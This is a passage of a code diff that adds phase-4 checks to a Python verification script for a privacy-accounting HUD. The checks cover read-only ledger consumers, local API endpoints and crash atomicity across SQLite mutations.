+    reader: summaries, lists, details, the terminal renderers, the HUD
+    snapshot, the local HTTP endpoints and the MCP helpers. A null
+    percentage stays null, and the reader cannot write."""
+    import json
+    import tempfile
+    import types
+
+    from privacy_hud import hud_snapshot, local_ui_server, mcp_tools, render
+    from privacy_hud.accounting import AccountingSummary
+
+    matrix = load_matrix()
+    reader = Ledger(path, matrix, initialize=False)
+    try:
+        sids = [r[0] for r in reader.conn.execute(
+            "SELECT session_id FROM sessions WHERE accounting_version=2"
+            " AND session_id LIKE ? ORDER BY session_id",
+            (_P4_PREFIX + "%",))]
+        _check(len(sids) >= 5, "phase4-consumers")
+        with tempfile.TemporaryDirectory() as hud_root:
+            publisher = hud_snapshot.HudPublisher(Path(hud_root))
+            for sid in sids:
+                summary = mcp_tools.get_session_summary(reader, sid)
+                _check(isinstance(summary, AccountingSummary),
+                       "phase4-consumers")
+                coverage = mcp_tools.get_session_coverage(reader, sid)
+                rows = mcp_tools.list_exposures(reader, sid, "All events")
+                for tab in ("Exposed", "Prevented"):
+                    mcp_tools.list_exposures(reader, sid, tab)
+                for row in rows:
+                    detail = mcp_tools.get_exposure_detail(reader, sid, row.id)
+                    _check(detail.as_dict() == row.as_dict(),
+                           "phase4-consumers")
+                    render.detail(detail)
+                render.audit(summary, rows, "All events", coverage=coverage,
+                             session_id=sid)
+                receipt = render.receipt(sid, summary, rows, None,
+                                         coverage=coverage)
+                _check(receipt.startswith("PRIVACY RECEIPT"),
+                       "phase4-consumers")
+                publisher.publish(sid, summary=summary,
+                                  unverified=not coverage.verified)
+                reading = hud_snapshot.read_snapshot(Path(hud_root), sid)
+                _check(reading is not None
+                       and reading.percent == summary.percent,
+                       "phase4-consumers")
+                for endpoint in ("/api/summary", "/api/exposures"):
+                    replies: list = []
+                    handler = object.__new__(local_ui_server._Handler)
+                    handler.server = types.SimpleNamespace(ledger=reader)
+                    handler.path = (f"{endpoint}?session_id={sid}"
+                                    "&tab=All%20events")
+                    handler._send_json = (
+                        lambda status, body, replies=replies:
+                        replies.append((status, json.loads(json.dumps(body)))))
+                    handler.do_GET()
+                    _check(len(replies) == 1 and replies[0][0] == 200,
+                           "phase4-consumers")
+                    body = replies[0][1]
+                    served = body if endpoint == "/api/summary" \
+                        else body["summary"]
+                    _check(served["accounting_version"] == 2
+                           and served["percent"] == summary.percent,
+                           "phase4-consumers")
+        try:
+            reader.conn.execute("UPDATE sessions SET budget_score=0")
+            wrote = True
+        except sqlite3.OperationalError:
+            wrote = False
+        _check(not wrote, "phase4-consumers")
+    finally:
+        reader.conn.close()
+
+
+def _check_phase4_crash_atomicity(
+    baseline: Path,
+    work: Path,
+) -> None:
+    """Terminate activation, an observation and a version-2 end after
+    every mutation and around the outer COMMIT, each on a fresh clone of
+    its own baseline. Before COMMIT the clone is exactly that baseline;
+    after it, the complete operation. Children take their own ownership
+    root; the parent holds none while they run."""
+    from privacy_hud.runtime_owner import owns_writer
+
+    matrix = load_matrix()
+    _mkdir(work)
+    child = work / "child.py"
+    child.write_text(_CHILD4, encoding="utf-8")
+    os.chmod(child, 0o600)
+    key = os.urandom(32).hex()
+    sid = _P4_PREFIX + "crash-" + uuid.uuid4().hex
+
+    base = work / "base.db"
+    _copy(baseline, base)
+    activated = work / "activated.db"
+    _copy(baseline, activated)
+    with _owned(work / "activated-owner") as lease:
+        led = Ledger(activated, matrix, writer_lease=lease)
+        try:
+            from privacy_hud.hook_evidence import CurrentHookAdapter
+            start = CurrentHookAdapter().normalize(
+                payload={"hook_event_name": "SessionStart",
+                         "session_id": sid},
+                delivery_key=uuid.uuid4().hex, accounting_key=None)
+            _check(led.start_accounted_session(
+                sid, cwd="", model="",
+                profile=ScoringProfile.from_matrix(matrix),
+                start_observation=dispatch._lifecycle_record(sid, start)),
+                "phase4-crash-state")
+        finally:
+            led.conn.close()
+
+    def snapshot(path: Path) -> tuple:
+        raw = _raw(path)
+        try:
+            return (ledger_schema.validate_schema(raw), _schema(raw),
+                    tuple((t, tuple(_cells(raw, t))) for t in _tables(raw)),
+                    _fk_violations(raw))
+        finally:
+            raw.close()
+
+    def remove(path: Path) -> None:
+        for suffix in ("", "-wal", "-shm"):
+            target = Path(str(path) + suffix)
+            if target.exists():
+                target.unlink()
+
+    for op, source in (("activate", base), ("observe", activated),
+                       ("end", activated)):
+        delivery = uuid.uuid4().hex
+        target_sid = (_P4_PREFIX + "crash-new-" + delivery
+                      if op == "activate" else sid)
+        before = snapshot(source)
+
+        def run(path: Path, stop: int, op=op, target_sid=target_sid,
+                delivery=delivery):
+            _check(not owns_writer(Path(str(path) + ".owner")),
+                   "phase4-writer-ownership")
+            return _run_child([str(child), op, str(stop), str(path),
+                               str(REPO / "src"), target_sid, key,
+                               delivery])
+
+        dry = work / f"{op}-dry.db"
+        _copy(source, dry)
+        proc = run(dry, -2)
+        _check(proc.returncode == 6 and proc.stdout.isdigit(),
+               "phase4-crash-child")
+        mutations = int(proc.stdout)
+        _check(mutations >= 1, "phase4-crash-child")
+        expected = snapshot(dry)
+        _check(expected[0] == ledger_schema.ACTIVATED_VERSION,
+               "phase4-crash-state")
+        remove(dry)
+        for stop in list(range(1, mutations + 1)) + [0, -1]:
+            path = work / f"{op}-{stop}.db"
+            _copy(source, path)
+            proc = run(path, stop)
+            code = 5 if stop == -1 else 4 if stop == 0 else 3
+            _check(proc.returncode == code, "phase4-crash-child")
+            state = snapshot(path)
+            if stop == -1:
+                _check(state == expected, "phase4-crash-state")
+            else:
+                _check(state == before, "phase4-crash-state")
+            _check(state[3] == before[3], "phase4-foreign-keys")
+            remove(path)
+    remove(base)
+    remove(activated)
+
+
 def main(argv: list[str] | None = None) -> int:
     parser = argparse.ArgumentParser(add_help=True)
     parser.add_argument("--source", required=True, type=Path)
     parser.add_argument("--work-dir", required=True, type=Path)
     parser.add_argument(
-        "--phase", required=True, type=int, choices=(2, 3),
+        "--phase", required=True, type=int, choices=(2, 3, 4),
     )
     args = parser.parse_args(argv)
     try:
@@ -1173,8 +2093,10 @@ def main(argv: list[str] | None = None) -> int:
         _check(source.resolve().parent != work.resolve(), "source-in-work-dir")
         if args.phase == 2:
             phase2(source, work)
-        else:
+        elif args.phase == 3:
             phase3(source, work)
+        else:
+            phase4(source, work)
     except CheckFailed as failed:
         print(FAIL)
         print(f"check: {failed.args[0]}", file=sys.stderr)
